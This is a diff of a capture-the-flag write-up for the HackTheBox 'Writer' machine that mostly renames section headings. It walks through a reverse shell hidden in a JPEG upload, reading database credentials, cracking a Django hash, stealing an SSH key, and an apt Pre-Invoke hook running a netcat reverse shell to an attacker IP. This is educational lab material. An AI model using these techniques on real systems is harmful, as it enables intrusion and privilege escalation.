@@ -2,7 +2,10 @@
 IP address : 10.10.11.101\
 OS : Linux
 
-## Enumeration
+## Discovery
+Before we being, let's  add the IP address and host to  our ```/etc/hosts``` file. 
+
+### Nmap
 Firstly, let us enumerate all the open ports using ```Nmap```
 * sV : service detection
 * sC : Run default nmap scripts
@@ -26,14 +29,8 @@ Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoo
 nmap -sU -Pn 10.10.11.101 -T4 -vv 
 ```
 
-Before we continue furthur, we will add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 
-
-```
-10.10.11.101    writer.htb
-```
-
-## Discovery
-Firstly, We will now run ```gobuster``` on ```http://writer.htb``` to enumerate the directories on the endpoints. From the output, we discover an interesting ```/adminstrative``` endpoint.
+### Gobuster
+Firstly, We will now run Gobuster on ```http://writer.htb``` to enumerate the directories on the endpoints. From the output, we discover an interesting ```/adminstrative``` endpoint.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -65,6 +62,7 @@ http://writer.htb/server-status        (Status: 403) [Size: 275]
 2021/09/11 14:06:47 Finished
 ===============================================================
 ```
+### Web content discovery
  From the output, we realize that there is a ```/administrative``` endpoint that returns a status code of 200 and visiting this site brings us to an admin login page
  
  ![admin login page](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/admin_login.PNG)
@@ -78,7 +76,9 @@ Looking through the website, we notice that there is a ```/dashboard/stories/<po
 
 Upon the upload of the file, we notice that the file will be saved in ```http://writer.htb/static/img/``` and the image will be updated at ```http://writer.htb/blog/post/<post id>```
 
-Now, we will create a base64-encoded reverse shell payload. Afterwards, we have to create a JPEG image with the payload.
+## Exploit
+### Reverse shell via file uploads
+We will first create a base64-encoded reverse shell payload. Afterwards, we have to create a JPEG image with the payload.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop]
@@ -93,7 +93,7 @@ JjEi
 Afterwards, we will intercept the POST request during file upload to create the reverse shell.
 ![Modifying request using burp](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/file_burp.PNG)
 
-## Obtaining user shell
+### Obtaining reverse shell
 Now, we would have obtained a reverse shell. We will first stabilize the shell
 ```
 ┌──(kali㉿kali)-[~]
@@ -121,7 +121,7 @@ ls
 john  kyle
 www-data@writer:/home$ 
 ```
-
+### Obtaining database credentials
 Navigating to ```/etc/mysql``` we are able to find a ```mariadb.cnf``` that contains credentials to the mysql database
 
 ```
@@ -168,7 +168,7 @@ Enter password: DjangoSuperPassword
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 ```
-
+### Obtaining password hasehes
 Now, we will login to the mysql database and try to obtain the credentials to login to the ssh server. 
 ```
 MariaDB [dev]> show tables;
@@ -198,6 +198,7 @@ select * from auth_user;
 +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
 ```
 
+### Cracking password hashes
 We will first try to identify the hash type and the hash is identified to possibly be Django hash using HashCat
 ```
 ┌──(kali㉿kali)-[~]
@@ -214,7 +215,7 @@ Afterwards, we will now we will use HashCat to decode the hash and obtain the pa
 └─$ hashcat -m 10000 hash.txt rockyou.txt --show                                             3 ⚙
 pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
 ```
-
+### Obtaining user flag
 Finally, we will now ssh into the user ```kyle``` and obtain the user flag.
 
 ```
@@ -233,7 +234,7 @@ kyle@writer:~$ cat user.txt
 kyle@writer:~$ 
 ```
 
-## Obtaining root flag
+## Exploiting postfix
 
 Firstly, we will check if the user ```kyle``` is able to execute any programs with root privileges. It seems that ```kyle``` cannot execute any programs with root privileges.
 
@@ -371,7 +372,7 @@ john@writer:/var/spool/postfix$ id
 id
 uid=1001(john) gid=1001(john) groups=1001(john)
 ```
-
+### Obtaining private key for SSH
 Next, what we have to do is to save the ```id_rsa``` file into our local machine so that we can SSH into ```john```
 
 ```
@@ -399,6 +400,7 @@ Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
 john@writer:~$ 
 ```
 
+### Obtaining a root shell
 Executing Linpeas.sh script on user ```john```, we realize that ```john``` is part of the ```management``` group and this group have a writable file ```/etc/apt/apt.conf.d```
 
 ```
@@ -420,7 +422,7 @@ Now, we will try to create a reverse shell by creating a payload in the ```/etc/
 john@writer:~$ cd /etc/apt/apt.conf.d
 john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444 >/tmp/f"};' > payload
 ```
-
+### Obtaining root flag
 Finally, we will stabilize the shell and extract the system flag
 
 ```
